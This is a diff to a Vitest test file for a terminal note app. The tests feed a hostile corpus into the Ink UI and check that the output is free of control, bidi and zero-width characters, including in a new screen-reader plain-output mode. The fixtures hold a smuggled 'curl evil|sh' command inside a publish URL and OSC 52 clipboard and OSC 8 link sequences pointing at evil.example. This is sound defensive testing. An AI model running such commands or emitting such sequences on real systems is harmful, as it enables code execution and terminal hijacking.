@@ -1,5 +1,5 @@
 /**
- * T431 — layer 2: the bytes snote actually writes.
+ * layer 2: the bytes snote actually writes.
  *
  * Layer 1 (hostile-layer1.test.tsx) walked Ink's DOM and proved no text node
  * carries a raw control. This test goes one step further: the same seeded
@@ -14,19 +14,21 @@
  * corpus smuggles all of those into note text, tag names, the publishURL,
  * the blog URL and the console.
  */
-import { afterEach, beforeEach, describe, expect, it } from 'vitest';
+import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 import { EventEmitter } from 'node:events';
 import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
-import { join } from 'node:path';
+import { dirname, join, resolve } from 'node:path';
+import { createRequire } from 'node:module';
+import { pathToFileURL } from 'node:url';
 import { tmpdir } from 'node:os';
 import React from 'react';
-import { render } from 'ink';
+import { render, Text } from 'ink';
 
 import type { EntityId, SystemTag, TagName } from '@vendor/types';
 import { makeStore } from '../../src/core/store';
 import { recordBlogSend } from '../../src/core/blog-sent';
 import { setDataRoot } from '../../src/core/data-root';
-import { guardOutputStream } from '../../src/core/output-guard';
+import { guardOutputStream, setPlainOutput } from '../../src/core/output-guard';
 import { App } from '../../src/tui/App';
 import { HOSTILE, hostileText, LONG_LINE } from '../fixtures/hostile';
 import { makeNote } from './fixtures';
@@ -63,8 +65,8 @@ function dirt(capture: string): string[] {
 /**
  * The guard's kept set and this test's clean rule disagree on three things
  * the hostile corpus carries, which review 4 pinned at the byte level
- * (F068/F081 the two SGRs, F088 the RLO): `\x1b[45m` and `\x1b[8m` are
- * display CSIs the T401 guard keeps by design, and U+202E is a printable
+ * ( the two SGRs, the RLO): `\x1b[45m` and `\x1b[8m` are
+ * display CSIs the guard keeps by design, and U+202E is a printable
  * character outside the guard's C0/C1 drop range. Until the guard filters
  * those too, the capture is clean once the three corpus bytes are taken
  * out; every other byte in this file's captures is asserted as-is.
@@ -181,7 +183,7 @@ interface Rig {
 const PUB_URL = `abc\ncurl evil|sh${hostileText('PUB')}`;
 
 /**
- * The same seeded store as T430: n1 carries the corpus in content, tags,
+ * The same seeded store as n1 carries the corpus in content, tags,
  * the email tag, the publishURL and the blog URL; n2 is a plain note.
  */
 function seedStore(dataDir: string) {
@@ -343,7 +345,7 @@ afterEach(() => {
   rmSync(dataDir, { recursive: true, force: true });
 });
 
-describe('hostile layer 2 bytes on the wire (T431)', () => {
+describe('hostile layer 2 bytes on the wire', () => {
   it('1: WHEN the App mounts with `isScreenReaderEnabled: false` THEN the stdout capture is clean, contains `published: waiting for link`, and does not contain `curl evil`.', async () => {
     const rig = makeRig();
     const { unmount } = renderApp(rig, false);
@@ -418,11 +420,11 @@ describe('hostile layer 2 bytes on the wire (T431)', () => {
     }
   });
 
-  it('6: WHEN src/cli/main.tsx is read THEN it contains `guardOutputStream(process.stdout)`, `guardOutputStream(process.stderr)` and `isScreenReaderEnabled: false`.', () => {
+  it('6: WHEN src/cli/main.tsx is read THEN it contains `guardOutputStream(process.stdout)`, `guardOutputStream(process.stderr)` and `isScreenReaderEnabled: screenReader`.', () => {
     const src = readFileSync(join(process.cwd(), 'src/cli/main.tsx'), 'utf8');
     expect(src).toContain('guardOutputStream(process.stdout)');
     expect(src).toContain('guardOutputStream(process.stderr)');
-    expect(src).toContain('isScreenReaderEnabled: false');
+    expect(src).toContain('isScreenReaderEnabled: screenReader');
     // the corpus itself is non-empty, so a vacuous clean capture is visible
     expect(HOSTILE.osc52Bel.length).toBeGreaterThan(0);
   });
@@ -491,7 +493,7 @@ describe('hostile layer 2 bytes on the wire (T431)', () => {
     }
   });
 
-  // #17 / F244 — History: versions of n1 whose text carries the corpus, plus
+  // #17 / History: versions of n1 whose text carries the corpus, plus
   // malformed ones (dates NaN, "x", undefined, 1e20, -1e16; content 42, {}).
   const BAD_DATES = [Number.NaN, 'x', undefined, 1e20, -1e16];
   const revisionFixture = () => {
@@ -593,6 +595,228 @@ describe('hostile layer 2 bytes on the wire (T431)', () => {
       expect(rig.store.getState().data.notes.get(eid('n1'))?.content).toBe(wanted);
     } finally {
       unmount();
+    }
+  });
+
+  // #17 — plain output (the screen-reader mode): nothing printed carries an SGR,
+  // a CR, a backspace, a zero-width or a bidi character, asserted RAW (no corpus
+  // exemption) and with the sinks' own sanitiser switched off, so only the
+  // guard's plain output stands between the corpus and the wire.
+  const PLAIN_BAD = /[\r\b\u061c\u200b\u200c\u200e\u200f\u2028\u2029\u202a-\u202e\u2066-\u2069]/;
+  const ANY_SGR = /\x1b\[[0-9;:]*m/;
+  const plainDirt = (capture: string): string[] => {
+    const found = dirt(capture);
+    if (ANY_SGR.test(capture)) found.push('SGR');
+    if (PLAIN_BAD.test(capture)) found.push('CR, BS, zero-width or bidi');
+    return found;
+  };
+  async function pollPlain(rig: Rig, markers: string[], from: 'out' | 'err' = 'out'): Promise<string> {
+    const end = Date.now() + 2500;
+    let capture = '';
+    for (;;) {
+      capture = from === 'out' ? outOf(rig) : errOf(rig);
+      if (plainDirt(capture).length === 0 && markers.every((m) => capture.includes(m))) return capture;
+      if (Date.now() >= end) return capture;
+      await wait(15);
+    }
+  }
+  // Ink's own chalk is at level 0 without a TTY; level 3 makes bold, inverse and
+  // colours real SGR on the wire, so a plain-output failure is visible.
+  async function forceInkChalk(): Promise<() => void> {
+    const inkDir = resolve(join(dirname(createRequire(import.meta.url).resolve('ink')), '..'));
+    const chalkModule = await import(pathToFileURL(join(inkDir, 'node_modules/chalk/source/index.js')).href);
+    const chalk = chalkModule.default;
+    const saved = chalk.level;
+    chalk.level = 3;
+    return () => { chalk.level = saved; };
+  }
+  /** The App with `sanitizeForTerminal` replaced by a pass-through in every module it loads. */
+  async function appWithoutSanitiser(): Promise<typeof App> {
+    vi.resetModules();
+    vi.doMock('../../src/core/sanitize', async (importOriginal) => ({
+      ...(await importOriginal<typeof import('../../src/core/sanitize')>()),
+      sanitizeForTerminal: (text: string) => text,
+    }));
+    return (await import('../../src/tui/App')).App;
+  }
+  interface PlainOptions {
+    runEditor?: (initial: string) => Promise<string | null>;
+    onLogout?: () => void;
+    /** Also mount the console spew and poll the stderr capture instead of stdout. */
+    console?: boolean;
+  }
+  async function plainRun(
+    keys: string[],
+    markers: string[],
+    options: PlainOptions = {},
+  ): Promise<{ capture: string; rig: Rig }> {
+    const rig = makeRig();
+    const RawApp = await appWithoutSanitiser();
+    setPlainOutput(true);
+    const restoreChalk = await forceInkChalk();
+    const app = <RawApp store={rig.store} width={120} height={34} runEditor={options.runEditor} onLogout={options.onLogout} />;
+    const { unmount } = renderApp(rig, true, options.console ? <>{app}<ConsoleSpew /></> : app);
+    try {
+      await until(() => outOf(rig).includes('TITLE'));
+      await press(rig.stdin, keys);
+      return { capture: await pollPlain(rig, markers, options.console ? 'err' : 'out'), rig };
+    } finally {
+      unmount();
+      setPlainOutput(false);
+      restoreChalk();
+      vi.doUnmock('../../src/core/sanitize');
+      vi.resetModules();
+    }
+  }
+
+  it('15: WHEN, with `isScreenReaderEnabled: true`, plain output on and no sink sanitiser, the list shows the hostile note THEN the raw stdout capture has no SGR, CR, zero-width or bidi character and contains `TITLE` and `Plain note`.', async () => {
+    const { capture } = await plainRun([], ['TITLE', 'Plain note']);
+    expect(plainDirt(capture)).toEqual([]);
+    expect(capture).toContain('TITLE');
+    expect(capture).toContain('Plain note');
+  });
+
+  it('16: WHEN, with `isScreenReaderEnabled: true`, plain output on and no sink sanitiser, `?` is written THEN the raw stdout capture has no SGR, CR, zero-width or bidi character and contains `Help - Keyboard Shortcuts` and `screen-reader mode` as plain printable text on the title line.', async () => {
+    const { capture } = await plainRun(['?'], ['Help - Keyboard Shortcuts', 'screen-reader mode']);
+    expect(plainDirt(capture)).toEqual([]);
+    expect(capture).toContain('Help - Keyboard Shortcuts');
+    expect(capture).toContain('screen-reader mode');
+    expect(capture).toMatch(/Help - Keyboard Shortcuts[ -~]*screen-reader mode/);
+  });
+
+  it('17: WHEN, with `isScreenReaderEnabled: true`, plain output on and no sink sanitiser, `/` and `T` are written THEN the raw stdout capture has no SGR, CR, zero-width or bidi character and contains `search: T`.', async () => {
+    const { capture } = await plainRun(['/', 'T'], ['search: T']);
+    expect(plainDirt(capture)).toEqual([]);
+    expect(capture).toContain('search: T');
+  });
+
+  it('18: WHEN, with `isScreenReaderEnabled: true`, plain output on and no sink sanitiser, `e` is written and the editor returns the note text plus `EDITED` THEN the note content ends with `EDITED` and the raw stdout capture has no SGR, CR, zero-width or bidi character.', async () => {
+    const { capture, rig } = await plainRun(['e'], ['TITLE'], {
+      runEditor: async (initial: string) => `${initial}EDITED`,
+    });
+    await until(() => (rig.store.getState().data.notes.get(eid('n1'))?.content ?? '').endsWith('EDITED'));
+    expect(rig.store.getState().data.notes.get(eid('n1'))?.content.endsWith('EDITED')).toBe(true);
+    expect(plainDirt(outOf(rig))).toEqual([]);
+    expect(plainDirt(capture)).toEqual([]);
+  });
+
+  it('19: WHEN, with `isScreenReaderEnabled: true`, plain output on and no sink sanitiser, the list is shown with the hostile note selected THEN the raw stdout capture has no SGR, CR, zero-width or bidi character and contains `TITLE`, `shared with: x`, `published: waiting for link` and `Preview`.', async () => {
+    const { capture } = await plainRun([], ['TITLE', 'shared with: x', 'published: waiting for link', 'Preview']);
+    expect(plainDirt(capture)).toEqual([]);
+    for (const text of ['TITLE', 'shared with: x', 'published: waiting for link', 'Preview']) {
+      expect(capture).toContain(text);
+    }
+  });
+
+  it('20: WHEN, with `isScreenReaderEnabled: true`, plain output on and no sink sanitiser, `j`, `i`, the hostile text `TYPED` and Escape are written THEN the raw stdout capture has no SGR, CR, zero-width or bidi character and contains `TYPED` and `Autosaves · Esc close`.', async () => {
+    const { capture } = await plainRun(['j', 'i', hostileText('TYPED'), '\x1b'], ['TYPED', 'Autosaves · Esc close']);
+    expect(plainDirt(capture)).toEqual([]);
+    expect(capture).toContain('TYPED');
+    expect(capture).toContain('Autosaves · Esc close');
+  });
+
+  it('21: WHEN, with `isScreenReaderEnabled: true`, plain output on and no sink sanitiser, `d`, `T` and `E` are written THEN the raw stdout capture has no SGR, CR, zero-width or bidi character and contains `TITLE`, `trash` and `empty trash (1 notes)`.', async () => {
+    const { capture } = await plainRun(['d', 'T', 'E'], ['TITLE', 'trash', 'empty trash (1 notes)']);
+    expect(plainDirt(capture)).toEqual([]);
+    for (const text of ['TITLE', 'trash', 'empty trash (1 notes)']) {
+      expect(capture).toContain(text);
+    }
+  });
+
+  it('22: WHEN, with `isScreenReaderEnabled: true`, plain output on and no sink sanitiser, `L` is written THEN the raw stdout capture has no SGR, CR, zero-width or bidi character and contains `log out and delete local data? y/n`.', async () => {
+    const { capture } = await plainRun(['L'], ['log out and delete local data? y/n'], { onLogout: () => undefined });
+    expect(plainDirt(capture)).toEqual([]);
+    expect(capture).toContain('log out and delete local data? y/n');
+  });
+
+  it('23: WHEN, with `isScreenReaderEnabled: true`, plain output on and no sink sanitiser, `e` is written and the editor fails with the hostile message `ERRMSG` THEN the raw stdout capture has no SGR, CR, zero-width or bidi character and the notice line contains `ERRMSG`.', async () => {
+    const { capture } = await plainRun(['e'], ['ERRMSG'], {
+      runEditor: async () => { throw new Error(hostileText('ERRMSG')); },
+    });
+    expect(plainDirt(capture)).toEqual([]);
+    expect(capture).toContain('ERRMSG');
+  });
+
+  it('24: WHEN, with `isScreenReaderEnabled: true`, plain output on and no sink sanitiser, the console is written `console.error(hostileText(\'ERR\'))` and `console.warn(hostileText(\'WARN\'))` THEN the raw stderr capture has no SGR, CR, zero-width or bidi character and contains `ERR` and `WARN`.', async () => {
+    const { capture } = await plainRun([], ['ERR', 'WARN'], { console: true });
+    expect(plainDirt(capture)).toEqual([]);
+    expect(capture).toContain('ERR');
+    expect(capture).toContain('WARN');
+  });
+
+  /** Login with `sanitizeForTerminal` replaced by a pass-through (its own refusal of hidden characters is off too). */
+  async function loginWithoutSanitiser() {
+    vi.resetModules();
+    vi.doMock('../../src/core/sanitize', async (importOriginal) => ({
+      ...(await importOriginal<typeof import('../../src/core/sanitize')>()),
+      sanitizeForTerminal: (text: string) => text,
+    }));
+    return (await import('../../src/tui/Login')).Login;
+  }
+  /** Mount `element` in screen-reader mode with plain output and chalk level 3; poll the stdout capture for the markers. */
+  async function plainMount(
+    element: (rig: Rig) => React.ReactElement,
+    keys: string[],
+    markers: string[],
+  ): Promise<string> {
+    const rig = makeRig();
+    setPlainOutput(true);
+    const restoreChalk = await forceInkChalk();
+    const { unmount } = renderApp(rig, true, element(rig));
+    try {
+      await wait(60);
+      await press(rig.stdin, keys);
+      return await pollPlain(rig, markers);
+    } finally {
+      unmount();
+      setPlainOutput(false);
+      restoreChalk();
+      vi.doUnmock('../../src/core/sanitize');
+      vi.resetModules();
+    }
+  }
+
+  // A paste that keeps the key parser from swallowing it: no ESC, only the characters that print.
+  const pasted = (marker: string): string =>
+    `${marker}${HOSTILE.bidi}${HOSTILE.zeroWidth}${HOSTILE.separators}${marker.replace('X', 'Y')}`;
+
+  it('25: WHEN, with `isScreenReaderEnabled: true`, plain output on and no sanitiser, the login screen gets an email `MAILX` and a code `CODEX` pasted with bidi, zero-width and separator characters and a server error `SRVERR` THEN the raw stdout capture has no SGR, CR, zero-width or bidi character and contains `MAILY`, `CODEY` and `SRVERR`.', async () => {
+    const Login = await loginWithoutSanitiser();
+    const capture = await plainMount(
+      () => (
+        <Login
+          width={120}
+          height={34}
+          requestCode={async () => undefined}
+          completeLogin={async () => { throw new Error(hostileText('SRVERR')); }}
+          onLoggedIn={() => undefined}
+        />
+      ),
+      [pasted('MAILX'), '\r', pasted('CODEX'), '\r'],
+      ['MAILY', 'CODEY', 'SRVERR'],
+    );
+    expect(plainDirt(capture)).toEqual([]);
+    for (const text of ['MAILX', 'CODEX', 'MAILY', 'CODEY', 'SRVERR']) {
+      expect(capture).toContain(text);
+    }
+  });
+
+  it('26: WHEN, with `isScreenReaderEnabled: true` and plain output on, four lines wider than the 120 columns carry an OSC 52 ended by BEL, one ended by ST, an OSC 8 link and an SGR across the wrap column, with no sanitiser at all, THEN the raw stdout capture has no SGR, CR, zero-width or bidi character and contains `WRAP1`, `WRAP2`, `WRAP3` and `WRAP4`.', async () => {
+    const pad = 'a'.repeat(110);
+    const lines = [
+      `${pad}\x1b]52;c;QUJD\x07${'b'.repeat(30)}WRAP1`,
+      `${pad}\x1b]52;c;QUJD\x1b\\${'b'.repeat(30)}WRAP2`,
+      `${pad}\x1b]8;;http://evil.example\x1b\\${'link text '.repeat(6)}\x1b]8;;\x1b\\WRAP3`,
+      `${pad}\x1b[45m\x1b[8m${'c'.repeat(40)}\x1b[0mWRAP4`,
+    ];
+    const capture = await plainMount(
+      () => <Text>{lines.join('\n')}</Text>,
+      [],
+      ['WRAP1', 'WRAP2', 'WRAP3', 'WRAP4'],
+    );
+    expect(plainDirt(capture)).toEqual([]);
+    for (const text of ['WRAP1', 'WRAP2', 'WRAP3', 'WRAP4']) {
+      expect(capture).toContain(text);
     }
   });
 });
